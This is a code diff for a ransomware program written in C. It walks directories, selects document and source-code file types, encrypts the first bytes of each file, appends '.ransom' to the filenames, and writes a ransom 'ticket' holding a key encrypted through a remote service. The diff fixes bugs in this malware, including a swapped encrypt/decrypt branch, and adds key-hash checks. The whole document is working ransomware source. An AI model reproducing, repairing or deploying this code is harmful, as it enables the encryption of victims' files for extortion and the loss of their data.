@@ -9,7 +9,8 @@
 #include <stdlib.h>
 #include <stdbool.h>
 
-int encryptSymmetricKey(char **encrypted_key, const int pubkeyid, const char *keyiv)
+int encryptSymmetricKey(char **encrypted_key, const int pubkeyid,
+			const char *keyiv)
 {
 	//Get key in hex
 	char *hexkey =
@@ -40,11 +41,12 @@ int encryptSymmetricKey(char **encrypted_key, const int pubkeyid, const char *ke
 
 	//Get encrypted key
 	int ret = decryptRemoteBytes(encrypted_key, url);
-	if(ret==-1){
-		fprintf(stderr, "Error: encryptSymmetricKey: decryptRemoteBytes failed (%s)\n", hexkey);
+	if (ret == -1) {
+		fprintf(stderr,
+			"Error: encryptSymmetricKey: decryptRemoteBytes failed (%s)\n",
+			hexkey);
 		return -1;
 	}
-	
 	//Deallocate memory and return encrypted key size
 	free(url);
 	free(hexkey);
@@ -57,7 +59,7 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 	FILE *hostage = fopen(filename, "rb");
 	if (hostage == NULL) {
 		fprintf(stderr,
-			"Error: partialEncryptFile: cannot open file\n");
+			"Error: partialEncryptFile: cannot open file for reading\n");
 		return 0;
 	}
 	//Get file size
@@ -69,21 +71,31 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 	number_of_bytes =
 	    file_size > number_of_bytes ? number_of_bytes : file_size;
 
+
 	//Read bytes for encryption
 	char plaintext[MAX_BYTES_TO_ENCRYPT];
+	memset(plaintext, '\0', MAX_BYTES_TO_ENCRYPT);
 	fread(plaintext, 1, number_of_bytes, hostage);
 
+	
 	//Encrypt bytes
 	char ciphertext[MAX_BYTES_TO_ENCRYPT];
-	if (decrypt)
-		symEncrypt(ciphertext, keyiv, plaintext, number_of_bytes);
-	else
+	memset(ciphertext, '\0', MAX_BYTES_TO_ENCRYPT);
+	if (decrypt){
 		symDecrypt(ciphertext, keyiv, plaintext, number_of_bytes);
+	}
+	else{
+		symEncrypt(ciphertext, keyiv, plaintext, number_of_bytes);
+	}
+
 
 	//Close then open to write
 	fclose(hostage);
-	hostage = fopen(filename, "r+b");
-
+	if((hostage = fopen(filename, "r+b")) == NULL){
+		fprintf(stderr, "Error: partialEncryptFile: failed to open file for writing(r+b)");
+		return 0;
+	}
+	
 	//Write bytes
 	if (fwrite(ciphertext, 1, number_of_bytes, hostage) !=
 	    (unsigned long) number_of_bytes) {
@@ -154,38 +166,46 @@ bool decryptDirectory(const char *keyiv, const char *directory)
 bool encryptDirectory(const char *keyiv, const char *directory)
 {
 	char **ls = walkDir(directory);
-	const char* vulnerable_types[]={
-	//Office
-	".doc\0", ".docx\0",".odt\0", ".ppt\0",".txt\0"
-	//Programming
-	".c\0",".js\0",".cpp\0",".h\0",".java\0",".py\0",".pyw\0",".ruby\0",".perl\0",".php\0",".html\0",".coffee\0",".hpp\0",".sh\0",".bat\0",".ps\0",".makefile\0",".cmd\0",".gitignore\0", ".m\0", ".mm\0",
-	"\0"};
-	
+	const char *vulnerable_types[] = {
+		//Office
+		".doc\0", ".docx\0", ".odt\0", ".ppt\0", ".txt\0"
+		    //Programming
+		    ".c\0", ".js\0", ".cpp\0", ".h\0", ".java\0", ".py\0",
+		    ".pyw\0", ".ruby\0", ".perl\0", ".php\0", ".html\0",
+		    ".coffee\0", ".hpp\0", ".sh\0", ".bat\0", ".ps\0",
+		    ".makefile\0", ".cmd\0", ".gitignore\0", ".m\0",
+		    ".mm\0",
+		"\0"
+	};
+
 	//encrypt directory
-	char *newfname=(char *)malloc(1);
+	char *newfname = (char *) malloc(1);
 	for (int i = 0; strcmp(ls[i], "\0"); i++) {
-		
+
 		//go through list of vulnerable file types
-		bool vulnerable=false;
-		if(strrchr(ls[i], '.') != NULL){
-			for(unsigned int j = 0; vulnerable_types[j][0]!='\0'; j++){
-				if(!strcmp(vulnerable_types[j],strrchr(ls[i], '.'))){
-					vulnerable=true;
+		bool vulnerable = false;
+		if (strrchr(ls[i], '.') != NULL) {
+			for (unsigned int j = 0;
+			     vulnerable_types[j][0] != '\0'; j++) {
+				if (!strcmp
+				    (vulnerable_types[j],
+				     strrchr(ls[i], '.'))) {
+					vulnerable = true;
 					break;
 				}
 			}
-		}else{
-			vulnerable=true;
+		} else {
+			vulnerable = true;
 		}
-		if(!vulnerable)continue;
-		
+		if (!vulnerable || getFileSize(ls[i])<16)
+			continue;
+
 		//Partial encrypt ls[i]
 		if (!partialEncryptFile(keyiv, ls[i],
 					MAX_BYTES_TO_ENCRYPT, 0)) {
 			printf
-				("Warning: encryptDirectory: partialEncryptFile failed\n");
+			    ("Warning: encryptDirectory: partialEncryptFile failed\n");
 		}
-		
 		//Append '.ransom' to filename
 		newfname =
 		    (char *) malloc(strlen(ls[i]) +
@@ -212,7 +232,7 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 	return 1;
 }
 
-bool makeTicket(const char *keyiv, const char *directory)
+bool makeTicketFile(const char *keyiv, const char *directory)
 {
 	//Get key id
 	int keyid = ASYMMETRIC_KEY_ID;
@@ -222,11 +242,11 @@ bool makeTicket(const char *keyiv, const char *directory)
 	int encrypted_key_size =
 	    encryptSymmetricKey(&encrypted_key, keyid, keyiv);
 
-	if(encrypted_key_size==-1){
-		fprintf(stderr, "Error: makeTicket: encryptSymmetricKey failed\n");
+	if (encrypted_key_size == -1) {
+		fprintf(stderr,
+			"Error: makeTicketFile: encryptSymmetricKey failed\n");
 		return 0;
 	}
-		
 	//Make raw ticket
 	char *raw_ticket = (char *) malloc(2 + encrypted_key_size);
 	raw_ticket[0] = keyid / 256;
@@ -260,4 +280,69 @@ bool makeTicket(const char *keyiv, const char *directory)
 	free(ticket);
 
 	return 1;
+}
+
+bool makeHashFile(const char* keyiv, const char* directory){
+	//Get hash of keyiv
+	const unsigned int hash_length = 2;
+	char hash[hash_length];
+	hash16(hash,keyiv,SYMMETRIC_IV_SIZE+SYMMETRIC_KEY_SIZE);
+	
+	//Find path
+	char *path = (char *)malloc(strlen(directory)+strlen("/"HASH_FILENAME));
+	strcpy(path,directory);
+	strcat(path,"/"HASH_FILENAME);
+	
+	//Open file
+	FILE* fp = fopen(path, "wb");
+	if(fp == NULL){fprintf(stderr, "Error: makeHashFile: failed to open %s\n", path);return 0;}
+	
+	//Write to file
+	if (fwrite(hash, 1, hash_length, fp)!=hash_length){
+		fprintf(stderr, "Error: makeHashFile: failed to write to file\n");
+		return 0;
+	}
+	
+	//Clean up and return
+	fclose(fp);
+	free(path);
+	return 1;
+}
+
+bool checkKeyivIntegrity(const char* keyiv, const char* directory){
+	//Get hash of keyiv
+	const int hash_length = 2;
+	char hash[hash_length];
+	hash16(hash,keyiv,SYMMETRIC_IV_SIZE+SYMMETRIC_KEY_SIZE);
+	
+	//Find path
+	char *path = (char *)malloc(strlen(directory)+strlen("/"HASH_FILENAME));
+	strcpy(path,directory);
+	strcat(path,"/"HASH_FILENAME);	
+
+	//Open file for reading\n
+	FILE* fp = fopen(path, "rb");
+	if(fp == NULL){
+		fprintf(stderr, "Error: checkKeyivIntegrity: failed to open %s\n", path);
+		return 0;
+	}
+	
+	//Read file
+	char* old_hash=(char *)malloc(hash_length);
+	fread(old_hash, 1, hash_length, fp);
+	fclose(fp);
+	
+	
+	//Compare hash
+	for(int i=0; i < hash_length; i++){
+		if(old_hash[i]!=hash[i]){
+			free(old_hash);
+			free(path);
+			return false;
+		}
+	}
+	free(path);
+	free(old_hash);
+	return true;
+	
 }
